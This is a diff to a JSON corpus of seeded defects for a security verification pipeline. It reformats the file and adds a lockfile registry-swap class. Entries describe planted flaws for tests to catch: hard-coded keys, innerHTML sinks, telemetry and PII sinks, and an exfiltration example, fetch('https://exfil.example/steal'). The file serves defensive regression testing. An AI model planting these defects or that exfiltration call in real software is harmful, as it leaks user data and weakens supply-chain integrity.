@@ -1,17 +1,72 @@
 {
-  "note": "The standing calibration corpus (mandate S12 / §9.3). Seeded defect classes the pipeline must catch. The heartbeat re-injects these on a schedule; a class the pipeline stops catching is a FAILED GATE and freezes releases. Corpus grows with every real defect found and every incident (§9.9). Track C seeds (D7-D9) added at catalogue v2.0 per Part 2 Phase 2': an exfiltration path, an unattested shipped-component change, and a personal-data/telemetry sink.",
-  "baseline_catch_rate": "9/9",
+  "note": "The standing calibration corpus (mandate S12 / \u00a79.3). Seeded defect classes the pipeline must catch. The heartbeat re-injects these on a schedule; a class the pipeline stops catching is a FAILED GATE and freezes releases. Corpus grows with every real defect found and every incident (\u00a79.9). Track C seeds (D7-D9) added at catalogue v2.0 per Part 2 Phase 2': an exfiltration path, an unattested shipped-component change, and a personal-data/telemetry sink. | v2.0+: D10 (lockfile/registry drift) added with the C-03 harness-pinning close.",
+  "baseline_catch_rate": "10/10",
   "recorded": "2026-07-16",
   "catalogue_version": "2.0",
   "defects": [
-    { "id": "D1", "kind": "hard-coded-credential", "inject": "embed a bg_live_sk_/X-API-Key secret idiom in bubblegauge.jsx", "caught_by": "verify/tests/30 no-secrets" },
-    { "id": "D2", "kind": "missing-guard-clone", "inject": "weaken KEY_RE re-validation before base-URL construction", "caught_by": "verify/tests/30 KEY_RE-enforced" },
-    { "id": "D3", "kind": "nonexistent-dependency", "inject": "bump a pinned CDN version (e.g. react@18.3.2) leaving stale SRI", "caught_by": "verify/tests/35 pin-manifest (offline) + verify/tests/40 SRI-recompute (online)" },
-    { "id": "D4", "kind": "swallowed-exception", "inject": "make a catch handler return a fabricated 2xx status", "caught_by": "verify/tests/30 no-fabricated-success" },
-    { "id": "D5", "kind": "vacuous-assertion", "inject": "plant a tautological *.test.js outside verify/tests/", "caught_by": "verify/tests/35 no-stray-test-files" },
-    { "id": "D6", "kind": "untrusted-text-to-sink", "inject": "render API text via dangerouslySetInnerHTML/.innerHTML", "caught_by": "verify/tests/30 no-injection-sinks" },
-    { "id": "D7", "kind": "exfiltration-path", "inject": "add a fetch or rendered link to a non-allowlisted host (e.g. fetch('https://exfil.example/steal')) in a served file", "caught_by": "verify/tests/62 C-08/C-28 egress-allowlist", "track": "C" },
-    { "id": "D8", "kind": "unattested-shipped-change", "inject": "change a shipped component's bytes (e.g. edit bubblegauge.jsx) without regenerating governance/provenance-manifest.json", "caught_by": "verify/tests/61 C-37 provenance hash-drift", "track": "C" },
-    { "id": "D9", "kind": "personal-data-or-telemetry-sink", "inject": "add a runtime AI/telemetry sink or a PII-capturing input (navigator.sendBeacon, gtag(), type=password, localStorage) to a served file", "caught_by": "verify/tests/62 C-23/C-04 surface tripwire", "track": "C" }
+    {
+      "id": "D1",
+      "kind": "hard-coded-credential",
+      "inject": "embed a bg_live_sk_/X-API-Key secret idiom in bubblegauge.jsx",
+      "caught_by": "verify/tests/30 no-secrets"
+    },
+    {
+      "id": "D2",
+      "kind": "missing-guard-clone",
+      "inject": "weaken KEY_RE re-validation before base-URL construction",
+      "caught_by": "verify/tests/30 KEY_RE-enforced"
+    },
+    {
+      "id": "D3",
+      "kind": "nonexistent-dependency",
+      "inject": "bump a pinned CDN version (e.g. react@18.3.2) leaving stale SRI",
+      "caught_by": "verify/tests/35 pin-manifest (offline) + verify/tests/40 SRI-recompute (online)"
+    },
+    {
+      "id": "D4",
+      "kind": "swallowed-exception",
+      "inject": "make a catch handler return a fabricated 2xx status",
+      "caught_by": "verify/tests/30 no-fabricated-success"
+    },
+    {
+      "id": "D5",
+      "kind": "vacuous-assertion",
+      "inject": "plant a tautological *.test.js outside verify/tests/",
+      "caught_by": "verify/tests/35 no-stray-test-files"
+    },
+    {
+      "id": "D6",
+      "kind": "untrusted-text-to-sink",
+      "inject": "render API text via dangerouslySetInnerHTML/.innerHTML",
+      "caught_by": "verify/tests/30 no-injection-sinks"
+    },
+    {
+      "id": "D7",
+      "kind": "exfiltration-path",
+      "inject": "add a fetch or rendered link to a non-allowlisted host (e.g. fetch('https://exfil.example/steal')) in a served file",
+      "caught_by": "verify/tests/62 C-08/C-28 egress-allowlist",
+      "track": "C"
+    },
+    {
+      "id": "D8",
+      "kind": "unattested-shipped-change",
+      "inject": "change a shipped component's bytes (e.g. edit bubblegauge.jsx) without regenerating governance/provenance-manifest.json",
+      "caught_by": "verify/tests/61 C-37 provenance hash-drift",
+      "track": "C"
+    },
+    {
+      "id": "D9",
+      "kind": "personal-data-or-telemetry-sink",
+      "inject": "add a runtime AI/telemetry sink or a PII-capturing input (navigator.sendBeacon, gtag(), type=password, localStorage) to a served file",
+      "caught_by": "verify/tests/62 C-23/C-04 surface tripwire",
+      "track": "C"
+    },
+    {
+      "id": "D10",
+      "kind": "supply-chain-registry-swap",
+      "inject": "point a verify/package-lock.json dependency at a non-registry URL, drop its integrity, or range-pin a devDependency (^/~)",
+      "caught_by": "verify/tests/65-lockfile (C-03)",
+      "track": "C"
+    }
   ]
 }
